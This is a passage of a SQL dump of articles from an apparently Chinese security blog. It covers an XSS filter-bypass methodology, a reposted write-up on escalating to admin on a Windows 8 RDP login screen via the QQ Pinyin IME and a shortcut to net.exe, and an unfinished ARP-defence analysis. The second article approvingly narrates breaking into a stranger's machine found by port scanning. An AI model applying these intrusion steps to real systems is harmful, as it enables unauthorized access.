n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;某人在看到代码是&nbsp;&lt;a&nbsp;href=”xxxxu0022″&gt;&nbsp;的时候，问大家：“为什么u0022”不行啊？&nbsp;这种绕过是盲目的。\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在测试初期，我们如果不愿意去看对方的代码逻辑，可以采用“盲目”的方式去测试（用各种特殊字符去试探），这样可以节省很多时间。但是，当我们已经能够确定，数据输出位于哪个点时，比如上面这个&nbsp;xxxx&nbsp;，我们已经知道是输出到了&nbsp;href=”之间”&nbsp;&nbsp;的时候。我们就不能盲目的去”绕过”，一定要有针对性。这个针对性主要是以下几点。\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>A)</strong>&nbsp;输出点，是直接输出，还是经过了DOM。\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;简单通俗点的说法是：&nbsp;&nbsp;前者可以通过右键查看源代码，搜索到。&nbsp;&nbsp;后者通过右键查看源代码是搜索不到的。\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>B)</strong>&nbsp;直接输出点，是位于HTML标签里，还是位于Script脚本里，或者是Style里\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;HTML标签又分为：&nbsp;&nbsp;&nbsp;是在HTML标签之间：&nbsp;&lt;div&gt;&nbsp;内容在这里&nbsp;&lt;/div&gt;&nbsp;&nbsp;&nbsp;&nbsp;还是在HTML属性之间：&nbsp;&lt;img&nbsp;alt=”内容在这里”&gt;&nbsp;&nbsp;&nbsp;&nbsp;还是在HTML事件之间:&nbsp;&nbsp;&lt;img&nbsp;onload=”内容在这里”&gt;&nbsp;&nbsp;Script/style标签：&nbsp;&nbsp;&nbsp;根据输出自己去构造闭合，保证语法正确即可。\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>C)&nbsp;</strong>&nbsp;DOM输出点，这个需要一定的JS基础。\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<ol><li>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li><li>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;定位输出内容的JS代码段。&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li></ol>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<ul><li>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;查看此代码段，是否存在过滤问题。&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li></ul>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<ul><li>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果存在，制定绕过规则。&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li></ul>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<ol><li></li></ol>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>D)</strong>&nbsp;输出点，采用的什么过滤规则\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<ol><li>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li><li>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;了解以上B)中，&nbsp;&nbsp;&nbsp;每个点该过滤什么字符，&nbsp;&nbsp;&nbsp;如果没过滤什么字符，该怎么去利用。&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li></ol>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<ul><li>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;逐个测试法，看看目标输出点，到底过滤了哪些字符&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li></ul>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<ul><li>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;测试服务器端的一些转换逻辑，比如有些服务器会先将&amp;quot;转换为”&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li></ul>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<ul><li>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;确定是否可绕过，不能绕过的尽早放弃&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li></ul>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<ol><li></li></ol>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;总之，首先要了解如何防御，你才能了解，如何绕过，不能盲目。其中，B+D的规则基本是死的，偶尔碰上些服务器端过滤逻辑有问题的，是可以绕过的，尤其是服务器端采用黑名单的方式时。C则较为灵活，所谓的“绕过”往往是针对这种。\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>4.&nbsp;其它：</strong>\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<ol><li>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li><li>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;XSS，代码里明明看到插入了&nbsp;&lt;script&gt;，怎么不执行啊？<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这种问题，zone里貌似有几个帖子了，这里强调下，打开调试工具看代码的时候，请注意颜色。&nbsp;以chrome为例，只有&lt;script&gt;..&lt;/script&gt;标记以彩色显示时，才说明是插入了，而以黑色显示时，实际上的代码是：&amp;lt;script&amp;gt;….&nbsp;&amp;lt;/script&amp;gt;&nbsp;，其它标签同理。&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li></ol>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<ul><li>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;xxx&nbsp;xxxx=”xxx”&gt;&nbsp;这个放进去怎么不行啊？<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先确定你这个是XSS代码，此外，一些新手会在网上找到一些旧的资料，而有些XSS代码是IE6时代的产物，或者是浏览器特异的代码，所以一定要注意代码来源，适用于什么浏览器。&nbsp;\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</li></ul>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<ol><li></li></ol>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>5.&nbsp;总结；</strong>\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;希望以后少出现一些类似下面的帖子：\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://zone.wooyun.org/content/1436\" jquery172017783332219740072=\"12\">http://zone.wooyun.org/content/1436</a><a href=\"http://zone.wooyun.org/content/1424\" jquery172017783332219740072=\"13\">http://zone.wooyun.org/content/1424</a><a href=\"http://zone.wooyun.org/content/1543\" jquery172017783332219740072=\"14\">http://zone.wooyun.org/content/1543</a><a href=\"http://zone.wooyun.org/content/1438\" jquery172017783332219740072=\"15\">http://zone.wooyun.org/content/1438</a><a href=\"http://zone.wooyun.org/content/1169\" jquery172017783332219740072=\"16\">http://zone.wooyun.org/content/1169</a>\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;阅读此文时，可参见我之前做的一个PPT：\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href=\"http://vdisk.weibo.com/s/9Cvwn\" jquery172017783332219740072=\"17\">http://vdisk.weibo.com/s/9Cvwn</a>\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style=\"color:#ff0000;\">ps:这个ppt讲挖掘xss的，看了以后写的很好，对于学xss挖掘的同志有很好的帮组，强烈推荐</span>\r\n&nbsp;&nbsp;&nbsp;&nbsp;</p>\r\n</div>\r\n<p>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\r\n</p>', 'shack2', '798', '1', '0', '127.0.0.1', '2012-11-13 00:33:04', '1', '1');
INSERT INTO articleinfo VALUES ('198', '1', '6', 'WIN8系统的远程桌面漏洞-利用QQ拼音纯净版实现提权', '<p>看了这篇文章，不错，转来大家看看，只能说，笔者这个脑子啊，总是用不完啊</p><h1 style=\"text-align:center;\"><strong>前言</strong></h1><p><br class=\"Apple-interchange-newline\" />发现这个漏洞的时候，<span style=\"text-align:left;\"> 笔者正在机房上课。正想用3389远程桌面去控制宿舍电脑的时候，因为重做系统忘记自己的IP地址，因此就随手扫描了一下IP段开3389端口的电脑。</span></p><p><span style=\"text-align:left;\">没想到就随手扫描到一台WIN8的系统，而且这个系统还装了QQ输入法WIN8纯净版。</span></p><p><span style=\"text-align:left;\"> &nbsp; &nbsp;当时我就想起初中时候的那个极品五笔的漏洞，就随手测试了一下，没想到在时隔7、8年后的今天，号称非常安全的WIN8系统居然还有如此大的漏洞。这边就把提权过程理一遍。</span></p><p style=\"text-align:left;\"> </p><hr /><h1 style=\"text-align:center;\">过程</h1><p style=\"text-align:center;\"> </p><p style=\"text-align:center;\">首先确认装有这个QQ拼音输入法</p><p style=\"text-align:left;\"><img style=\"display:block;margin-right:auto;margin-left:auto;\" src=\"/static/uploadImage/1353482289721.jpg\" /></p><p style=\"text-align:left;\"> </p><p style=\"text-align:center;\"> </p><p style=\"text-align:center;\">ctrl+空格调出托盘，找到这个选项</p><p><img style=\"display:block;margin-right:auto;margin-left:auto;\" src=\"/static/uploadImage/1353482292028.jpg\" /></p><p> </p><p> </p><p style=\"text-align:center;\">顺利开启IE浏览器</p><p style=\"text-align:center;\"><img style=\"display:block;margin-right:auto;margin-left:auto;\" src=\"/static/uploadImage/1353482293046.jpg\" /></p><p style=\"text-align:center;\"> </p><p style=\"text-align:center;\"><strong>这边需要说明的事，IE浏览器和WIN8安全性确实是提高了非常多。</strong></p><p style=\"text-align:center;\"><strong>随手在地址栏输入D: &nbsp;<a href=\"file:///d:\">file://d:</a> 这样的命令都无法打开文件夹</strong></p><p style=\"text-align:center;\"><strong>本以为只要随便上传一个bat批处理，写上提权用的命令，然后利用IE下载下来打开运行即可，</strong></p><p style=\"text-align:center;\"><strong>没想到各种提示系统要求验证您的用户密码等，根本无法进行下载，可见常规方式真的行不通</strong></p><p style=\"text-align:center;\"><strong>微软还是有在修复这些漏洞，但是经过笔者的诸多尝试，最终发现有一处漏洞尚未填补</strong></p><p style=\"text-align:center;\"> </p><p style=\"text-align:center;\"> </p><p style=\"text-align:center;\"><strong><br /></strong>那就是文件菜单的-另存为选项，将网页文件另存为即可打开文件夹对话框</p><p><img style=\"display:block;margin-right:auto;margin-left:auto;\" src=\"/static/uploadImage/1353482294512.jpg\" /></p><p style=\"text-align:center;\"> </p><p style=\"text-align:center;\"><strong>这个时候感觉已经快要接近胜利，但是经过半节课多的尝试，笔者始终无法再有实质性的突破</strong></p><p style=\"text-align:center;\"> </p><p style=\"text-align:center;\"><strong>如图，文件夹选项卡已经被限定成几种mnt、txt等格式</strong></p><p><img style=\"display:block;margin-right:auto;margin-left:auto;\" src=\"/static/uploadImage/1353482297550.jpg\" /></p><p> </p><p> </p><p style=\"text-align:center;\"><strong>笔者甚至能用记事本等程序打开进行提权命令编辑，但是关键的地方却始终被微软限制</strong></p><p style=\"text-align:center;\"><strong>不管是另存为bat或者打开其他程序，均无法显示或者正常打开。</strong></p><p style=\"text-align:center;\"><strong>而且就算保存成bat，在当前限定的mnt、txt等文件可查看的情况下根本也无法看到生成后的文件</strong></p><p><img style=\"display:block;margin-right:auto;margin-left:auto;\" src=\"/static/uploadImage/1353482300180.jpg\" /></p><p style=\"text-align:center;\"><strong>在进行了诸多尝试，甚至开启文件夹共享，也无法生效</strong></p><p style=\"text-align:center;\"><strong>可见WIN8还是对安全性进行了很大的提升</strong></p><p style=\"text-align:center;\"> </p><p style=\"text-align:center;\">这个时候，笔者想起初中时奋斗的那些日日夜夜，想到了解决办法</p><p style=\"text-align:center;\">没错，就是用快捷方式的漏洞</p><p style=\"text-align:center;\">在无法查看任何exe等可执行文件的情况下，包括net.exe 这个关键的提权程序时，实际上也可以直接创建快捷方式</p><p style=\"text-align:center;\">对这个快捷方式直接赋参数运行。随便创建一个快捷方式，然后将目标改为系统目录里面的net文件 后面空格附上参数即可</p><p style=\"text-align:center;\"> </p><p style=\"text-align:center;\">创建用户Helper</p><p><img style=\"display:block;margin-right:auto;margin-left:auto;\" src=\"/static/uploadImage/1353482301831.jpg\" /></p><p style=\"text-align:center;\"> </p><p style=\"text-align:center;\">将用户加入管理组，获取最高权限</p><p><img style=\"display:block;margin-right:auto;margin-left:auto;\" src=\"/static/uploadImage/1353482303997.jpg\" /></p><p> </p><p style=\"text-align:center;\">好了激动人心的时刻到了</p><p><img style=\"display:block;margin-right:auto;margin-left:auto;\" src=\"/static/uploadImage/1353482305419.jpg\" /></p><p> </p><p style=\"text-align:center;\">OK，登陆成功,用了一节课时间就可以了。</p><p><img style=\"display:block;margin-right:auto;margin-left:auto;\" src=\"/static/uploadImage/1353482306151.jpg\" /></p><p> </p><p style=\"text-align:center;\">本次只测试过QQ拼音输入法，其他输入法如果能直接调出IE的话，利用相同的办法也可以直接提权，希望微软尽快修复这个漏洞吧。</p><p> </p>', 'shack2', '845', '1', '0', '127.0.0.1', '2012-11-21 02:20:22', '0', '0');
INSERT INTO articleinfo VALUES ('199', '1', '7', '如何有效的防止ARP攻击', '<p>ARP<span style=\"font-size:16px;\">欺骗和攻击问题，是企业网络的心腹大患。关于这个问题的讨论已经很深入了，对ARP攻击的机理了解的很透彻，各种防范措施也层出不穷。</span><br /></p><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\"><br /></span><span style=\"font-family:宋体;font-size:16px;\">但问题是，现在真正摆脱ARP问题困扰了吗？从用户那里了解到，虽然尝试过各种方法，但这个问题并没有根本解决。原因就在于，目前很多种ARP防范措施，一是解决措施的防范能力有限，并不是最根本的办法。二是对网络管理约束很大，不方便不实用，不具备可操作性。三是某些措施对网络传输的效能有损失，网速变慢，带宽浪费，也不可取。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\"><br /></span><span style=\"font-family:宋体;font-size:16px;\">本文通过具体分析一下普遍流行的四种防范ARP措施，去了解为什么ARP问题始终不能根治。</span></p><br /><p style=\"text-align:left;\"><br /><strong><span style=\"font-family:宋体;font-size:16px;\">上篇：四种常见防范ARP措施的分析</span></strong></p><br /><p style=\"text-align:left;\"><strong><span style=\"font-family:宋体;font-size:16px;\">一、双绑措施</span></strong></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\"><br /></span><span style=\"font-family:宋体;font-size:16px;\">双绑是在路由器和终端上都进行IP-MAC绑定的措施，它可以对ARP欺骗的两边，伪造网关和截获数据，都具有约束的作用。这是从ARP欺骗原理上进行的防范措施，也是最普遍应用的办法。它对付最普通的ARP欺骗是有效的。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\"><br /></span><span style=\"font-family:宋体;font-size:16px;\">但双绑的缺陷在于3点：</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">1、<br /></span><span style=\"font-family:宋体;font-size:16px;\">在终端上进行的静态绑定，很容易被升级的ARP攻击所捣毁，病毒的一个ARP <br />–d命令，就可以使静态绑定完全失效。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">2、<br /></span><span style=\"font-family:宋体;font-size:16px;\">在路由器上做IP-MAC表的绑定工作，费时费力，是一项繁琐的维护工作。换个网卡或更换IP，都需要重新配置路由。对于流动性电脑，这个需要随时进行的绑定工作，是网络维护的巨大负担，网管员几乎无法完成。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">3、<br /></span><span style=\"font-family:宋体;font-size:16px;\">双绑只是让网络的两端电脑和路由不接收相关ARP信息，但是大量的ARP攻击数据还是能发出，还要在内网传输，大幅降低内网传输效率，依然会出现问题。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">因此，虽然双绑曾经是ARP防范的基础措施，但因为防范能力有限，管理太麻烦，现在它的效果越来越有限了。</span></p><br /><p style=\"text-align:left;\"><strong><span style=\"font-family:宋体;font-size:16px;\">二、ARP个人防火墙</span></strong></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\"><br /></span><span style=\"font-family:宋体;font-size:16px;\">在一些杀毒软件中加入了ARP个人防火墙的功能，它是通过在终端电脑上对网关进行绑定，保证不受网络中假网关的影响，从而保护自身数据不被窃取的措施。ARP防火墙使用范围很广，有很多人以为有了防火墙，ARP攻击就不构成威胁了，其实完全不是那么回事。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\"><br />ARP</span><span style=\"font-family:宋体;font-size:16px;\">个人防火墙也有很大缺陷：</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">1</span><span style=\"font-family:宋体;font-size:16px;\">、它不能保证绑定的网关一定是正确的。如果一个网络中已经发生了ARP欺骗，有人在伪造网关，那么，ARP个人防火墙上来就会绑定这个错误的网关，这是具有极大风险的。即使配置中不默认而发出提示，缺乏网络知识的用户恐怕也无所适从。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">2 </span><span style=\"font-family:宋体;font-size:16px;\">、ARP是网络中的问题，ARP既能伪造网关，也能截获数据，是个“双头怪”。在个人终端上做ARP防范，而不管网关那端如何，这本身就不是一个完整的办法。ARP个人防火墙起到的作用，就是防止自己的数据不会被盗取，而整个网络的问题，如掉线、卡滞等，ARP个人防火墙是无能为力的。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\"><br /></span><span style=\"font-family:宋体;font-size:16px;\">因此，ARP个人防火墙并没有提供可靠的保证。最重要的是，它是跟网络稳定无关的措施，它是个人的，不是网络的。</span></p><br /><p style=\"text-align:left;\"><strong><span style=\"font-family:宋体;font-size:16px;\">三、VLAN和交换机端口绑定</span></strong></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\"><br /></span><span style=\"font-family:宋体;font-size:16px;\">通过划分VLAN和交换机端口绑定，以图防范ARP，也是常用的防范方法。做法是细致地划分VLAN，减小广播域的范围，使ARP在小范围内起作用，而不至于发生大面积影响。同时，一些网管交换机具有MAC地址学习的功能，学习完成后，再关闭这个功能，就可以把对应的MAC和端口进行绑定，避免了病毒利用ARP攻击篡改自身地址。也就是说，把ARP攻击中被截获数据的风险解除了。这种方法确实能起到一定的作用。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\"><br /></span><span style=\"font-family:宋体;font-size:16px;\">不过，VLAN和交换机端口绑定的问题在于：</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">1、</span><span style=\"font-family:宋体;font-size:16px;\">没有对网关的任何保护，不管如何细分VLAN，网关一旦被攻击，照样会造成全网上网的掉线和瘫痪。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">2、</span><span style=\"font-family:宋体;font-size:16px;\">把每一台电脑都牢牢地固定在一个交换机端口上，这种管理太死板了。这根本不适合移动终端的使用，从办公室到会议室，这台电脑恐怕就无法上网了。在无线应用下，又怎么办呢？还是需要其他的办法。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">3、</span><span style=\"font-family:宋体;font-size:16px;\">实施交换机端口绑定，必定要全部采用高级的网管交换机、三层交换机，整个交换网络的造价大大提高。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\"><br /></span><span style=\"font-family:宋体;font-size:16px;\">因为交换网络本身就是无条件支持ARP操作的，就是它本身的漏洞造成了ARP攻击的可能，它上面的管理手段不是针对ARP的。因此，在现有的交换网络上实施ARP防范措施，属于以子之矛攻子之盾。而且操作维护复杂，基本上是个费力不讨好的事情。</span></p><br /><p style=\"text-align:left;\"><strong><span style=\"font-family:宋体;font-size:16px;\">四、PPPoE</span></strong></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">网络下面给每一个用户分配一个帐号、密码，上网时必须通过PPPoE认证，这种方法也是防范ARP措施的一种。PPPoE拨号方式对封包进行了二次封装，使其具备了不受ARP欺骗影响的使用效果，很多人认为找到了解决ARP问题的终极方案。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">问题主要集中在效率和实用性上面：</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">1、</span><span style=\"font-family:宋体;font-size:16px;\">PPPoE</span><span style=\"font-family:宋体;font-size:16px;\">需要对封包进行二次封装，在接入设备上再解封装，必然降低了网络传输效率，造成了带宽资源的浪费，要知道在路由等设备上添加PPPoE Server的处理效能和电信接入商的PPPoE Server可不是一个数量级的。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">2、</span><span style=\"font-family:宋体;font-size:16px;\">PPPoE</span><span style=\"font-family:宋体;font-size:16px;\">方式下局域网间无法互访，在很多网络都有局域网内部的域控服务器、DNS服务器、邮件服务器、OA系统、资料共享、打印共享等等，需要局域网间相互通信的需求，而PPPoE方式使这一切都无法使用，是无法被接受的。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\">3、</span><span style=\"font-family:宋体;font-size:16px;\">不使用PPPoE，在进行内网访问时，ARP的问题依然存在，什么都没有解决，网络的稳定性还是不行。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\"><br /><br /></span><span style=\"font-family:宋体;font-size:16px;\">因此，PPPoE在技术上属于避开底层协议连接，眼不见心不烦，通过牺牲网络效率换取网络稳定。最不能接受的，就是网络只能上网用，内部其他的共享就不能在PPPoE下进行了。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\"><br /></span><span style=\"font-family:宋体;font-size:16px;\">通过对以上四种普遍的ARP防范方法的分析，我们可以看出，现有ARP防范措施都存在问题。这也就是ARP即使研究很久很透，但依然在实践中无法彻底解决的原因所在了。</span></p><br /><p style=\"text-align:left;\"><span style=\"font-family:宋体;font-size:16px;\"></span></p><br /><p style=\"text-align:left;\"><strong><span style=\"font-family:宋体;font-size:16px;\">下篇：免疫网络是解决ARP最根本的办法</span></strong></p><br /><p style=\"text-align:left;\"><span 